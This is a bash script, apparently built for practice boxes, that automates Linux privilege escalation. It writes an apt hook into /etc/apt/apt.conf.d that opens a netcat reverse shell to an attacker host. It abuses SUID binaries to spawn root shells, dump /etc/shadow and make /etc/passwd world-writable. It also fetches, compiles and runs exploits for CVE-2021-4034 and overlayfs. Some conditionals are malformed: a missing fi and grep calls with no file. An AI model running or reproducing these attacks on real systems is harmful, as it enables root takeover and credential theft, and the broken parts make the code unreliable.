#!/bin/bash

#As I do different boxes this will continue to be updated...
#Many of the exploits came from doing boxes on Proving Grounds Play and Practice
#Built by OvergrownCarrot1 Thanks for using

now=$(date)
i=$(whoami)
d=$(id)

cd /tmp

echo -e '\E[31;40m' "Script is not an end all be all, you may actually need to do some manual enumeration"; tput sgr0
echo -e '\E[32;40m'"Make sure linpeas is in the folder you have your web server on and is called linpeas.sh (ex: python3 -m http.server 8080)";tput sgr0
echo -e '\E[31;40m' "Segmentation fault or critical error is ok... let the script continue running";tput sgr0
sleep 2
echo -e '\E[31;40m' "LHOST"; tput sgr0
read LHOST
echo -e '\E[31;40m' "Web server LPORT"; tput sgr0
read LPORT

echo -e '\E[32;40m' "Before Downloading linpeas looking for easy wins";tput sgr0
echo -e '\E[31;40m' "Current user is $i within group $d" > info.txt
echo -e '\E[31;40m' "Script last ran on $now" >> info.txt
echo -e '\E[31;40m' "Looking at cronjobs";tput sgr0
cat /etc/crontab >> info.txt
if grep "apt-get" info.txt; then
	ls -la /etc/apt | grep apt.conf.d
	read -p "Is file writeable by user? (y/n)" answer
	if [ $answer = y ]; then
		echo -e '\E[31;40m' "If this does not work you can follow writeup here https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/"
		cd /etc/apt/apt.conf.d
		echo -e '\E[31;40m' "What port do you want to make a reverse shell on (LPORT)?";tput sgr0
		read LPORT1
		echo -e '\E[32;40m' "Putting file named pwn into /etc/apt/apt.conf.d"
		echo -e "apt::Update::Pre-Invoke" "{\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT1 >/tmp/f\"};" > pwn
		echo -e '\E[31;40m' "Wait for reverse shell on $LHOST port $LPORT1 (remember will take as long as cronjob takes to run)"; tput sgr0
		cat /etc/apt/apt.conf.d/pwn
		cd /tmp
	else
		echo -e '\E[31;40m' "Exploit should not work, can try manually if you would like"; tput sgr0
		echo -e '\E[32;40m' "If trying manually here you go https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/"
	fi
fi

echo -e '\E[31;40m' "Looking at SUID Bits"; tput sgr0
echo -e '\E[31;40m' "Ran SUID bits with user $i on $now" >> info.txt; tput sgr0
read -p "If any SUID bits found do you want to automatically exploit them for priv esc? (y/n)" answer
if [ $answer = n ] ; then
	find / -perm -u=s -type f 2>/dev/null >> info.txt
	echo '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
else
	find / -perm -u=s -type f 2>/dev/null >> info.txt
	if grep '/usr/bin/find' info.txt; then
		cd /usr/bin
		./find . -exec /bin/bash -p \; -quit
	elif grep "/usr/bin/bash" info.txt; then
		cd /usr/bin
		./bash -p
	elif grep "/usr/bin/arp" info.txt; then
		cd /usr/bin
		LFILE=/etc/shadow
		./arp -v -f "$LFILE"
	elif grep "/usr/bin/awk" info.txt; then
		cd /usr/bin
		LFILE=/etc/shadow 
		./awk '//' "$LFILE"
	elif grep "/usr/bin/base32" info.txt ; then
		LFILE=/etc/shadow
		base32 "$LFILE" | base32 --decode
	elif grep "/usr/bin/base64" info.txt ; then
		LFILE=/etc/shadow
		base64 "$LFILE" | base64 --decode
	elif grep "/usr/bin/basenc" info.txt ; then
		LFILE=/etc/shadow
		basenc --base64 $LFILE | basenc -d --base64
	elif grep "busybox" info.txt; then
		cd /usr/bin
		./busybox sh
	elif grep "/usr/bin/cat" info.txt; then
		LFILE=/etc/shadow
		./cat "$LFILE"
	elif grep "/usr/bin/chmod" info.txt ; then
		cd /usr/bin
		LFILE=/etc/shadow
		./chmod 6777 $LFILE
		echo "You can now add a user to /etc/shadow"
		LFILE=/etc/passwd
		./chmod 6777 $LFILE
		echo "You can now add a user to /etc/passwd"
	elif grep "cpulimit" info.txt ; then
		cd /usr/bin
		./cpulimit -l 100 -f -- /bin/sh -p
		cd /usr/sbin
		./cpulimit -l 100 -f -- /bin/sh -p
	elif grep "chroot" info.txt; then
		cd /usr/bin
		./chroot / /bin/sh -p
		cd /usr/sbin
		./chroot / /bin/sh -p
	elif grep "/usr/bin/wget" info.txt; then
		TF=$(mktemp)
		chmod +x $TF
		echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
		./wget --use-askpass=$TF 0
	elif grep "/usr/bin/vim"; then
		cd /usr/bin
		./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
	elif grep "unzip"; then
		cd /usr/bin
		./unzip -K shell.zip
		./sh -p
	elif grep "systemctl"; then
		TF=$(mktemp).service
		echo '[Service]
		Type=oneshot
		ExecStart=/bin/sh -c "id > /tmp/output"
		[Install]
		WantedBy=multi-user.target' > $TF
		cd /usr/bin
		./systemctl link $TF
		./systemctl enable --now $TF
fi

if grep LEGEND lin.txt
then
	echo -e '\E[31;40m' "lin.txt already exists not running linpeas"; tput sgr0
else
	read -p "Do you have a server started on kali with linpeas in the folder? (y/n):" answer
	if [ $answer = y ] ; then
		cd /tmp
		wget http://$LHOST:$LPORT/linpeas.sh
		echo -e '\E[31;40m' "Running linpeas and saving to lin.txt this may take a few minutes";tput sgr0
		echo -e '\E[31;40m' "Running linpeas with user $i on $now"
		bash linpeas.sh > lin.txt
	elif [ $answer = n ] ; then
		echo -e '\E[31;40m' "Start listener";tput sgr0
	else
		echo -e '\E[31;40m' "What do you want from me?" ;tput sgr0
	exit
	fi
fi
if grep CVE-2021-4034 lin.txt
then
	echo -e '\E[31;40m' "Vulnerable to Sudo exploit CVE-2021-4034";tput sgr0
	echo -e '\E[31;40m' "Found vulnerability with user $i on $now"
	read -p "Would you like to exploit this vulnerability (y/n):" answer
	if [ $answer = n ] ; then
		echo -e '\E[31;40m' "Not exploiting";tput sgr0
	elif [ $answer = y ] ; then
		echo -e '\E[32;40m' "Trying to download exploit from user machine" ;tput sgr0
		echo -e '\E[31;40m' "Do a 'wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c' to local kali machine and make sure python server is still running" ;tput sgr0
		read -p "Press enter when exploit is downloaded and python server is ready" ;tput sgr0
		wget http://$LHOST:$LPORT/cve-2021-4034-poc.c
		gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
		./cve-2021-4034-poc
		else
			echo -e '\E[31;40m' "Continuing Script";tput sgr0
	fi
fi

if grep overlayfs lin.txt
then
	echo -e '\E[31;40m' "Most likely vulnerable to Overlayfs"; tput sgr0
	echo -e '\E[31;40m' "Found vulnerability with user $i on $now"
	read -p "Would you like to exploit this vulnerability (y/n):" answer
	if [ $answer = n ] ; then
		echo -e '\E[31;40m' "Not exploiting";tput sgr0
	elif [ $answer = y ] ; then
		echo "Trying to exploit"
		if grep 'kernel:3.13.0' lin.txt
		then
			echo -e '\E[31;40m' "Do a searchsploit -m linux/local/37292.c on kali machine and make sure python server is still running" ;tput sgr0
			read -p "Press enter when exploit is downloaded and python server is ready" 
			wget http://$LHOST:$LPORT/37292.c
			gcc 37292.c -o 37292
			./37292
		else 
			echo -e '\E[31;40m' "Do a 'searchsploit -m linux/local/39166.c' on kali machine and make sure python server is still running" ;tput sgr0
			read -p "Press enter when exploit is downloaded and python server is ready" 
			wget http://$LHOST:$LPORT/39166.c
			gcc 39166.c -o 39166
			./39166
		fi
	fi
fi
